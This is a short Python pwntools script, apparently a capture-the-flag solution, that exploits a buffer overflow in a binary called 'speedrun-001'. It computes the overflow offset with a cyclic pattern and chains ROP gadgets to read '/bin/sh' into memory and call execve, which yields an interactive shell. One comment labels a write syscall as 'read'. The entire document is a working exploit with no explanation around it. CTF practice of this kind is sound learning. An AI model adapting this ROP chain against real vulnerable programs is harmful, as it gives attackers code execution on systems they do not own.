#!/usr/bin/python
from pwn import *
import time
p_rax_ret = 0x415664
p_rdi_ret = 0x400686
p_rsi_ret = 0x4101f3
p_rdx_ret = 0x4498b5
syscall_ret = 0x474e65
buf = 0x6b6000

payload =  cyclic(0x7d0)[:cyclic_find("iaakjaak")]
payload += p64(p_rax_ret) + p64(0x0) # read(0, buf, 8)
payload += p64(p_rdi_ret) + p64(0x0)
payload += p64(p_rsi_ret) + p64(buf)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(syscall_ret)
payload += p64(p_rax_ret) + p64(0x1) # read(0, buf, 8)
payload += p64(p_rdi_ret) + p64(0x1)
payload += p64(p_rsi_ret) + p64(buf)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(syscall_ret)
payload += p64(p_rax_ret) + p64(0x3b) #execve(buf, 0, 0)
payload += p64(p_rdi_ret) + p64(buf)
payload += p64(p_rsi_ret) + p64(0x0)
payload += p64(p_rdx_ret) + p64(0x0)
payload += p64(syscall_ret)
payload = payload.ljust(0x7d0)

with open("payload", "w+") as out :
    out.write(payload)
    out.close()

p = process("./speedrun-001")
p.send(payload)
p.send("/bin/sh\x00")
p.interactive()
